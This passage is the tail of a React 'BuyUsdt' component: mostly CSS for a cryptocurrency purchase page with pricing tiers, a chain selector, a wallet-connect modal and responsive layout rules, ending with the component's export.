          font-size: 13px;
          font-weight: 500;
          letter-spacing: 0.5px;
        }
        
        .hero-title {
          font-size: 3rem;
          font-weight: 800;
          margin-bottom: 16px;
          line-height: 1.1;
        }
        
        .hero-highlight {
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        
        .hero-subtitle {
          font-size: 1.1rem;
          color: var(--text-secondary);
          margin-bottom: 30px;
          line-height: 1.6;
          max-width: 600px;
          margin: 0 auto 30px;
        }
        
        .hero-extra {
          color: var(--accent-primary);
          font-weight: 600;
        }
        
        .hero-stats {
          display: flex;
          justify-content: center;
          gap: 30px;
          margin-top: 30px;
          flex-wrap: wrap;
        }
        
        .hero-stat {
          text-align: center;
          min-width: 100px;
        }
        
        .stat-number {
          font-size: 2rem;
          font-weight: 700;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 6px;
          line-height: 1;
        }
        
        .stat-label {
          color: var(--text-secondary);
          font-size: 13px;
          font-weight: 500;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Pricing Section */
        .pricing-section {
          margin-bottom: 40px;
        }
        
        .pricing-title {
          text-align: center;
          font-size: 2rem;
          margin-bottom: 12px;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        
        .pricing-subtitle {
          text-align: center;
          color: var(--text-secondary);
          margin-bottom: 30px;
          font-size: 1rem;
        }
        
        .pricing-tiers {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
          gap: 16px;
          margin-bottom: 30px;
        }
        
        .pricing-tier {
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: var(--border-radius);
          padding: 24px 20px;
          text-align: center;
          cursor: pointer;
          transition: all 0.3s;
          position: relative;
          overflow: hidden;
        }
        
        .pricing-tier:hover {
          border-color: rgba(0, 212, 170, 0.3);
          transform: translateY(-3px);
          box-shadow: var(--shadow-glow);
        }
        
        .pricing-tier.active {
          background: rgba(0, 212, 170, 0.1);
          border-color: var(--accent-primary);
          box-shadow: var(--shadow-glow);
        }
        
        .custom-tier {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }
        
        .tier-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 16px;
        }
        
        .tier-amount {
          font-size: 1.8rem;
          font-weight: 700;
          color: var(--text-primary);
        }
        
        .tier-badge {
          background: rgba(0, 212, 170, 0.1);
          color: var(--accent-primary);
          padding: 4px 10px;
          border-radius: 16px;
          font-size: 11px;
          font-weight: 600;
          letter-spacing: 0.5px;
        }
        
        .tier-badge.premium {
          background: rgba(139, 92, 246, 0.1);
          color: #8B5CF6;
        }
        
        .tier-usdt {
          margin-bottom: 12px;
        }
        
        .usdt-amount {
          font-size: 2.2rem;
          font-weight: 800;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          line-height: 1;
          margin-bottom: 6px;
        }
        
        .usdt-label {
          color: var(--text-secondary);
          font-size: 13px;
          font-weight: 500;
        }
        
        .tier-multiplier {
          color: var(--accent-primary);
          font-size: 13px;
          font-weight: 600;
          background: rgba(0, 212, 170, 0.1);
          padding: 4px 10px;
          border-radius: 10px;
          display: inline-block;
        }
        
        .tier-selected {
          position: absolute;
          top: 12px;
          right: 12px;
          background: var(--accent-primary);
          color: var(--bg-primary);
          padding: 3px 10px;
          border-radius: 10px;
          font-size: 11px;
          font-weight: 700;
          animation: pulse 2s infinite;
        }
        
        .custom-input {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-top: 8px;
        }
        
        .custom-amount-input {
          flex: 1;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          color: var(--text-primary);
          padding: 10px 14px;
          font-size: 15px;
          font-weight: 600;
          outline: none;
          transition: all 0.3s;
        }
        
        .custom-amount-input:focus {
          border-color: var(--accent-primary);
          box-shadow: 0 0 0 2px rgba(0, 212, 170, 0.2);
        }
        
        .custom-amount-input::placeholder {
          color: var(--text-tertiary);
        }
        
        .currency-symbol {
          color: var(--accent-primary);
          font-size: 18px;
          font-weight: 700;
          min-width: 24px;
        }
        
        /* Purchase Card */
        .purchase-section {
          max-width: 800px;
          margin: 0 auto;
        }
        
        .purchase-card {
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: var(--border-radius-lg);
          padding: 30px;
          position: relative;
          overflow: hidden;
          box-shadow: var(--shadow-card);
        }
        
        .card-glow {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(0, 212, 170, 0.1), transparent 70%);
          opacity: 0.3;
          pointer-events: none;
          z-index: -1;
        }
        
        .card-header {
          display: flex;
          align-items: center;
          gap: 16px;
          margin-bottom: 30px;
          padding-bottom: 20px;
          border-bottom: 1px solid var(--border-color);
        }
        
        .usdt-icon {
          font-size: 2.5rem;
          background: rgba(0, 212, 170, 0.1);
          border-radius: 14px;
          padding: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .card-title h2 {
          font-size: 1.8rem;
          margin-bottom: 4px;
        }
        
        .card-subtitle {
          color: var(--text-secondary);
          font-size: 13px;
        }
        
        .card-content {
          display: flex;
          flex-direction: column;
          gap: 24px;
        }
        
        /* Chain Selector */
        .chain-selector {
          margin-bottom: 10px;
        }
        
        .selector-title {
          font-size: 1rem;
          color: var(--text-secondary);
          margin-bottom: 14px;
          font-weight: 600;
        }
        
        .chain-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
          gap: 10px;
        }
        
        .chain-option {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 14px;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          color: var(--text-primary);
          cursor: pointer;
          transition: all 0.3s;
          text-align: left;
          position: relative;
        }
        
        .chain-option:hover {
          border-color: rgba(0, 212, 170, 0.3);
          transform: translateY(-2px);
        }
        
        .chain-option.active {
          background: rgba(0, 212, 170, 0.1);
          border-color: var(--accent-primary);
          box-shadow: 0 0 15px rgba(0, 212, 170, 0.2);
        }
        
        .chain-icon {
          font-size: 1.3rem;
        }
        
        .chain-info {
          flex: 1;
        }
        
        .chain-name {
          font-size: 13px;
          font-weight: 600;
          margin-bottom: 2px;
        }
        
        .chain-symbol {
          font-size: 11px;
          color: var(--text-secondary);
        }
        
        .chain-selected {
          color: var(--accent-primary);
          font-weight: bold;
          font-size: 14px;
        }
        
        /* Transaction Details */
        .transaction-details {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--border-color);
          border-radius: var(--border-radius);
          padding: 24px;
        }
        
        .details-title {
          font-size: 1.1rem;
          margin-bottom: 20px;
          color: var(--text-primary);
          font-weight: 600;
        }
        
        .detail-row {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          margin-bottom: 16px;
          padding-bottom: 16px;
          border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .detail-row:last-child {
          margin-bottom: 0;
          padding-bottom: 0;
          border-bottom: none;
        }
        
        .detail-label {
          font-size: 14px;
          color: var(--text-secondary);
          font-weight: 500;
          width: 160px;
          flex-shrink: 0;
        }
        
        .detail-value {
          font-size: 14px;
          font-weight: 500;
          color: var(--text-primary);
          flex: 1;
          text-align: right;
        }
        
        .address-display {
          display: flex;
          align-items: center;
          gap: 8px;
          justify-content: flex-end;
        }
        
        .wallet-icon-small {
          font-size: 12px;
        }
        
        .address-text {
          font-family: 'Monaco', 'Menlo', monospace;
          font-size: 12px;
          color: var(--text-secondary);
        }
        
        .wallet-name-small {
          font-size: 11px;
          color: var(--accent-primary);
          background: rgba(0, 212, 170, 0.1);
          padding: 2px 6px;
          border-radius: 6px;
          margin-left: 4px;
        }
        
        .not-connected {
          color: var(--text-tertiary);
          font-style: italic;
        }
        
        .amount-display {
          font-size: 16px;
          font-weight: 700;
          color: var(--text-primary);
        }
        
        .usdt-display {
          font-size: 16px;
          font-weight: 700;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        
        .network-badge {
          background: rgba(0, 212, 170, 0.1);
          color: var(--accent-primary);
          padding: 4px 10px;
          border-radius: 10px;
          font-size: 12px;
          font-weight: 600;
        }
        
        .tx-link {
          color: var(--accent-primary);
          text-decoration: none;
          font-family: 'Monaco', 'Menlo', monospace;
          font-size: 12px;
          transition: all 0.2s;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Connect to Buy Button */
        .connect-to-buy-btn {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          width: 100%;
          padding: 18px;
          background: rgba(0, 212, 170, 0.1);
          border: 2px dashed rgba(0, 212, 170, 0.3);
          border-radius: 14px;
          color: var(--accent-primary);
          font-size: 1rem;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }
        
        .connect-to-buy-btn:hover {
          background: rgba(0, 212, 170, 0.2);
          border-color: var(--accent-primary);
          transform: translateY(-2px);
        }
        
        .btn-icon {
          font-size: 1.3rem;
        }
        
        /* Connected Wallet Info */
        .connected-wallet-info {
          background: rgba(0, 212, 170, 0.05);
          border: 1px solid rgba(0, 212, 170, 0.2);
          border-radius: 14px;
          padding: 16px;
        }
        
        .wallet-display {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        
        .wallet-icon {
          font-size: 1.3rem;
        }
        
        .wallet-details {
          flex: 1;
        }
        
        .wallet-name {
          font-size: 13px;
          font-weight: 600;
          color: var(--accent-primary);
          margin-bottom: 4px;
        }
        
        .wallet-address-sm {
          font-family: 'Monaco', 'Menlo', monospace;
          font-size: 11px;
          color: var(--text-secondary);
        }
        
        .switch-wallet-btn {
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          color: var(--text-secondary);
          font-size: 12px;
          padding: 6px 12px;
          cursor: pointer;
          transition: all 0.2s;
        }
        
        .switch-wallet-btn:hover {
          background: rgba(0, 212, 170, 0.1);
          border-color: var(--accent-primary);
          color: var(--accent-primary);
        }
        
        /* Buy Button */
        .buy-button {
          position: relative;
          width: 100%;
          padding: 20px;
          background: var(--accent-gradient);
          border: none;
          border-radius: 14px;
          color: white;
          font-size: 1.1rem;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .buy-button:hover:not(.disabled) {
          transform: translateY(-2px);
          box-shadow: var(--shadow-glow);
        }
        
        .buy-button.disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .button-glow {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(255, 255, 255, 0.3), transparent 70%);
          opacity: 0;
          transition: opacity 0.3s;
          border-radius: 14px;
        }
        
        .buy-button:hover:not(.disabled) .button-glow {
          opacity: 0.3;
        }
        
        .loading-spinner {
          width: 20px;
          height: 20px;
          border: 2px solid rgba(255, 255, 255, 0.1);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .success-icon {
          font-size: 1.3rem;
          animation: scaleIn 0.3s ease-out;
        }
        
        @keyframes scaleIn {
          from { transform: scale(0); }
          to { transform: scale(1); }
        }
        
        /* Error Display */
        .purchase-error {
          display: flex;
          align-items: center;
          gap: 10px;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 10px;
          padding: 14px;
          animation: shake 0.5s;
        }
        
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-5px); }
          75% { transform: translateX(5px); }
        }
        
        .error-icon {
          font-size: 1.1rem;
          flex-shrink: 0;
        }
        
        .error-text {
          color: #EF4444;
          font-size: 0.9rem;
          flex: 1;
          line-height: 1.4;
        }
        
        /* Transaction Notice */
        .transaction-notice {
          display: flex;
          align-items: flex-start;
          gap: 12px;
          background: rgba(245, 158, 11, 0.1);
          border: 1px solid rgba(245, 158, 11, 0.3);
          border-radius: 10px;
          padding: 14px;
        }
        
        .notice-icon {
          font-size: 1rem;
          flex-shrink: 0;
          margin-top: 2px;
        }
        
        .notice-text {
          color: var(--warning-color);
          font-size: 0.85rem;
          line-height: 1.5;
          flex: 1;
        }
        
        /* Footer */
        .exchange-footer {
          padding: 40px 0 30px;
          border-top: 1px solid var(--border-color);
          background: rgba(10, 10, 10, 0.9);
          backdrop-filter: blur(10px);
        }
        
        .footer-content {
          text-align: center;
        }
        
        .footer-logo {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          margin-bottom: 16px;
        }
        
        .footer-logo-icon {
          font-size: 1.3rem;
        }
        
        .footer-logo-text {
          font-size: 1.1rem;
          font-weight: 700;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        
        .footer-copyright {
          color: var(--text-tertiary);
          margin-bottom: 20px;
          font-size: 13px;
        }
        
        .footer-links {
          display: flex;
          justify-content: center;
          flex-wrap: wrap;
          gap: 20px;
          margin-top: 16px;
        }
        
        .footer-link {
          color: var(--text-secondary);
          text-decoration: none;
          font-size: 13px;
          transition: all 0.3s;
          position: relative;
          padding: 4px 0;
        }
        
        .footer-link:hover {
          color: var(--accent-primary);
        }
        
        .footer-link::after {
          content: '';
          position: absolute;
          bottom: 0;
          left: 0;
          right: 0;
          height: 1px;
          background: var(--accent-primary);
          transform: scaleX(0);
          transition: transform 0.3s;
        }
        
        .footer-link:hover::after {
          transform: scaleX(1);
        }
        
        /* Modal */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.9);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 2000;
          backdrop-filter: blur(10px);
          animation: fadeIn 0.3s ease-out;
          padding: 20px;
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        .modal {
          background: var(--bg-card);
          border-radius: var(--border-radius-lg);
          width: 100%;
          max-width: 500px;
          border: 1px solid var(--border-color);
          box-shadow: var(--shadow-glow);
          animation: modalSlide 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
          max-height: 90vh;
          overflow-y: auto;
        }
        
        @keyframes modalSlide {
          from { transform: translateY(50px) scale(0.95); opacity: 0; }
          to { transform: translateY(0) scale(1); opacity: 1; }
        }
        
        .modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 24px;
          border-bottom: 1px solid var(--border-color);
          position: sticky;
          top: 0;
          background: var(--bg-card);
          z-index: 1;
        }
        
        .modal-title {
          font-size: 1.3rem;
          color: var(--accent-primary);
          font-weight: 600;
          margin: 0;
        }
        
        .modal-close {
          background: none;
          border: none;
          color: var(--text-secondary);
          font-size: 18px;
          cursor: pointer;
          padding: 6px;
          border-radius: 6px;
          transition: all 0.2s;
          width: 32px;
          height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .modal-close:hover:not(:disabled) {
          background: rgba(239, 68, 68, 0.1);
          color: #EF4444;
        }
        
        .modal-close:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .modal-content {
          padding: 24px;
          display: flex;
          flex-direction: column;
          gap: 20px;
        }
        
        .modal-notice {
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(0, 212, 170, 0.1);
          border: 1px solid rgba(0, 212, 170, 0.3);
          border-radius: 10px;
          padding: 14px;
        }
        
        .notice-icon {
          font-size: 1rem;
          flex-shrink: 0;
        }
        
        .notice-text {
          color: var(--accent-primary);
          font-size: 0.9rem;
          line-height: 1.4;
          flex: 1;
        }
        
        .wallet-group {
          margin-bottom: 5px;
        }
        
        .wallet-group-title {
          font-size: 1rem;
          color: var(--text-secondary);
          margin-bottom: 14px;
          font-weight: 600;
        }
        
        .wallet-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
          gap: 10px;
        }
        
        .wallet-option {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          gap: 6px;
          padding: 18px 12px;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          color: var(--text-primary);
          cursor: pointer;
          transition: all 0.3s;
          min-height: 90px;
          position: relative;
          overflow: hidden;
        }
        
        .wallet-option:hover:not(:disabled) {
          border-color: var(--wallet-color, var(--accent-primary));
          transform: translateY(-2px);
          box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
        }
        
        .wallet-option:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .wallet-option::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, var(--wallet-color, var(--accent-primary)), transparent 70%);
          opacity: 0;
          transition: opacity 0.3s;
          z-index: -1;
        }
        
        .wallet-option:hover:not(:disabled)::before {
          opacity: 0.2;
        }
        
        .wallet-option-icon {
          font-size: 1.8rem;
          margin-bottom: 4px;
        }
        
        .wallet-option-name {
          font-weight: 600;
          font-size: 13px;
        }
        
        .wallet-option-description {
          font-size: 10px;
          color: var(--text-secondary);
          opacity: 0.8;
        }
        
        .wallet-loading {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(10, 10, 10, 0.8);
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 10px;
        }
        
        .loading-spinner-small {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255, 255, 255, 0.1);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        
        .modal-error {
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 10px;
          padding: 14px;
          animation: shake 0.5s;
        }
        
        .modal-error-icon {
          font-size: 1rem;
          flex-shrink: 0;
        }
        
        .modal-error-text {
          color: #EF4444;
          font-size: 0.85rem;
          flex: 1;
          line-height: 1.4;
        }
        
        .modal-disclaimer {
          color: var(--text-tertiary);
          font-size: 0.75rem;
          text-align: center;
          line-height: 1.5;
          padding-top: 16px;
          border-top: 1px solid var(--border-color);
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .hero-title {
            font-size: 2.2rem;
          }
          
          .hero-subtitle {
            font-size: 1rem;
          }
          
          .hero-stats {
            gap: 20px;
          }
          
          .stat-number {
            font-size: 1.8rem;
          }
          
          .pricing-title {
            font-size: 1.8rem;
          }
          
          .pricing-tiers {
            grid-template-columns: 1fr;
            max-width: 320px;
            margin-left: auto;
            margin-right: auto;
          }
          
          .purchase-card {
            padding: 24px 16px;
          }
          
          .card-header {
            flex-direction: column;
            align-items: flex-start;
            gap: 12px;
          }
          
          .usdt-icon {
            font-size: 2rem;
            padding: 10px;
          }
          
          .card-title h2 {
            font-size: 1.5rem;
          }
          
          .chain-grid {
            grid-template-columns: repeat(2, 1fr);
          }
          
          .transaction-details {
            padding: 20px;
          }
          
          .detail-row {
            flex-direction: column;
            align-items: flex-start;
            gap: 6px;
          }
          
          .detail-label {
            width: 100%;
          }
        
          .detail-value {
            width: 100%;
            text-align: left;
          }
          
          .address-display {
            justify-content: flex-start;
          }
          
          .wallet-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-links {
            flex-direction: column;
            gap: 12px;
          }
          
          .hero-stats {
            flex-direction: column;
            align-items: center;
          }
          
          .hero-stat {
            width: 100%;
            max-width: 180px;
          }
          
          .admin-popup {
            padding: 20px;
            margin: 20px;
          }
          
          .admin-buttons {
            flex-direction: column;
          }
        }
        
        @media (max-width: 480px) {
          .hero-title {
            font-size: 1.8rem;
          }
          
          .pricing-tiers {
            max-width: 100%;
          }
          
          .purchase-card {
            padding: 20px 14px;
          }
          
          .chain-grid {
            grid-template-columns: 1fr;
          }
          
          .header-logo .logo-text {
            font-size: 1.2rem;
          }
          
          .connect-wallet-btn {
            padding: 8px 16px;
            font-size: 13px;
          }
          
          .wallet-badge {
            padding: 6px 10px;
            gap: 8px;
          }
          
          .wallet-address {
            font-size: 12px;
          }
          
          .modal {
            max-height: 80vh;
          }
          
          .admin-popup {
            width: 95%;
            padding: 15px;
          }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
          width: 6px;
          height: 6px;
        }
        
        ::-webkit-scrollbar-track {
          background: var(--bg-primary);
          border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb {
          background: var(--border-color);
          border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
          background: var(--accent-primary);
        }
        
        /* Selection */
        ::selection {
          background: rgba(0, 212, 170, 0.3);
          color: white;
        }
      `}</style>
    </div>
  );
}

export default BuyUsdt;
